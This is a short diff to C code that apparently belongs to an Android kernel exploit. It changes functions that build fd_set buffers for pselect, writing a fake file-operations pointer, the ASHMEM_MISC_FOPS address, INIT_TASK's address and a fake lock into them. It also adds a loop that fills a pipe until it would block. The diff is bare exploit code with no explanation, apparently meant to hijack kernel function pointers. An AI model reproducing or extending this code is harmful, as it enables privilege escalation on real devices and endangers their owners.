@@ -70,6 +70,14 @@ void open_selected_fds(
     }
   }
   close(high_write);
+
+  int fl = fcntl(write_fd, F_GETFL);
+  fcntl(write_fd, F_SETFL, fl | O_NONBLOCK);
+  char fill_buf[4096];
+  memset(fill_buf, 'P', sizeof(fill_buf));
+  while (write(write_fd, fill_buf, sizeof(fill_buf)) > 0) {}
+  fcntl(write_fd, F_SETFL, fl);
+
   dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
   FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
 }
@@ -83,9 +91,11 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   fdset_put_word(in, 1, 0);
   fdset_put_word(in, 2, 0);
   fdset_put_word(in, 3, 0);
+  fdset_put_word(out, 2, fake_fops);
+  fdset_put_word(out, 3, data_addr(ASHMEM_MISC_FOPS));
   fdset_put_word(ex, 0, text_addr(INIT_TASK));
   fdset_put_word(ex, 1, fake_lock);
-  fdset_put_word(ex, 2, 3);
+  fdset_put_word(ex, 2, 140);
   fdset_put_word(ex, 3, 0);
 }
 
